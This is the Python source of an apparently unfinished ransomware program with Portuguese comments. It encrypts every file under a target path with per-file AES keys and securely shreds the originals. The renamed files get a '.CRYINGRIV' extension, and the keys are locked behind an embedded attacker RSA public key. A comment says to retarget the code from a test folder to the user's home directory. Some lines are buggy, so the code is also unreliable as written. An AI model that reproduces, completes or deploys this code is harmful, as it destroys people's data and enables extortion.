from Crypto.Hash import SHA, MD5
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto import Random
from getters import Getters
from randomkey import generate_randomKey
from sym import AESHash
from asym import Assym
from paths_and_names import _name, _home, _home, _ransomware_path, _test_path
import base64, subprocess, pickle, gc, random, time, os, string
server_public_key = ("""-----BEGIN PUBLIC KEY-----
AAAAB3NzaC1yc2EAAAADAQABAAABAQDEoFZDxxrqEQ3tNQMYEEPqiSCBuxZJMMFSAMYbbsC8VbPXe+AWmyDnRYXqfaV1z4BpLuybHnxM2qwWjcDbz71DJA3sNFdHZVtyqaW7vneT610nsgh4XYct2za0cXtiEm9Besxrl40MY3BWp3pfvSC0EhUc2C+jenr6yyq5q3HKu6PMIMdfz4BKW1lYD8ZeiEM8SjhFFd1OSaK5zgrad05EH3EqIbTe5pldAHnRMWQoarf0H0DWXdYDFEtBDhvOfVdRxim8Blt3YjvVSs6G0mei131pVPYL29UlGV7afNvLvDAieS/bcKwpEmSuy/vdhkllEN1DPNqCIjV8DY2JGEZ9
-----END PUBLIC KEY-----""")

def encrypt_PrKey(msg, key):
    msg_line = msg
    x = [ msg_line[i:i+127] for i in range(0, len(msg_line), 127) ]
    
    key = RSA.importKey(key)
    hash_value = PKCS1_OAEP.new(key)
    hash = []
    for i in x:
        hash_text = hash_value.encrypt(i)
        hash.append(hash_text)

    return hash

def shred(file_name,  passes=1):

    def generate_data(length):
        chars = string.ascii_lowercase + string.ascii_uppercase + string.digits
        return ''.join(random.SystemRandom().choice(chars) for _ in range(length))

    if not os.path.isfile(file_name):
        print(file_name + " is not a file.")
        return False

    ld = os.path.getsize(file_name)
    fh = open(file_name,  "w")
    for _ in range(int(passes)):
        data = generate_data(ld)
        fh.write(data)
        fh.seek(0,  0)

    fh.close()
    os.remove(file_name)

def encryption(files):
    if not files:
        print("No files included")
        return None

    key_and_base64_path = []

    for file in files:
        # Gera uma chave aleatória de 128 bits, criptografada em base64
        key = generate_randomKey(128, True)

        # Gera uma cifra criptográfica da chave
        AES_obj = AESHash(key)

        # Decodifica o arquivo decodificado em base64
        file = base64.b64decode(file)

        # Recebe o conteúdo do arquivo
        try:
            with open(file, 'rb') as f:
                content = f.read()
        except:
            continue

        # Criptografa o conteúdo do arquivo com a chave aleatória gerada
        encrypted = AES_obj.encrypt(content)
        shred(file)
        # Adiciona ao nome do arquivo uma extensão de identificação de criptografia
        new_name = file + ".CRYINGRIV"

        # insere o arquivo criptografado
        with open(new_name, 'wb') as f:
            f.write(encrypted)

        key_and_base64_path.append(key, base64.b64encode(new_name))

    return key_and_base64_path

def main():
    get = Getters()
    try:
        os.mkdir(_ransomware_path, 0o700)
    except OSError:
        pass
    
    # Pegando todos os arquivos dentro do caminho de teste
    # QUANDO TESTAR, TROCAR PARA O HOME
    files = get.get_files(_test_path)
    
    # Cria um objeto do tipo RSA e gera as chaves
    rsa = Assym()
    rsa.generate()

    # Gera o objeto para a chave pública
    server_PuKey_obj = RSA.importKey(server_public_key)
    
    # Recupera as chaves públicas e privadas do usuário
    Client_PrKey = rsa.PrKey_PEM
    Client_PuKey = rsa.PuKey_PEM

    # Criptografa a chave do usuário com a chave pública do servidor
    encrypted_client_PrKey = encrypt_PrKey(Client_PrKey, server_public_key)

    # Salva a chave privada criptografada do usuário no diretório do malware
    with open(_ransomware_path + '/encrypted_client_PrKey.key', 'wb') as output:
        pickle.dump(encrypted_client_PrKey, output, pickle.HIGHEST_PROTOCOL)
    
    # Salva a chave pública no disco
    with open(_ransomware_path + '/client_PuKey.PEM') as f:
        f.write(Client_PuKey)
    
    # Libera a memória
    Client_PrKey = None
    rsa = None
    del rsa
    del Client_PrKey
    gc.collect()

    # Recupera a chave pública do usuário como um objeto
    Client_PuKey_obj = RSA.importKey(Client_PuKey)
    Client_PuKey_obj_cipher = PKCS1_OAEP.new(Client_PuKey_obj)

    # Criptografar arquivos
    keys_and_base64path = encryption(files)
    enc_keys_and_base64path = []
    for it in keys_and_base64path:
        AES_key = it[0]
        base64path = it[1]

        encrypted_key = Client_PuKey_obj_cipher.encrypt(AES_key)
        enc_keys_and_base64path.append((encrypted_key, base64path))
    
    # Elimina o objeto das chaves
    keys_and_base64path = None
    del keys_and_base64path
    gc.collect()

    with open(_ransomware_path + "/AES_encrypted_keys.txt", 'w') as file:
        for it in enc_keys_and_base64path:
            line = base64.b64decode(it[0]) + ": " + it[1] + "\n"
            file.write(line) 
    
    enc_keys_and_base64path = None
    del enc_keys_and_base64path
    gc.collect()

if __name__ == "__main__":
    main()
    #-----PAREI AQUI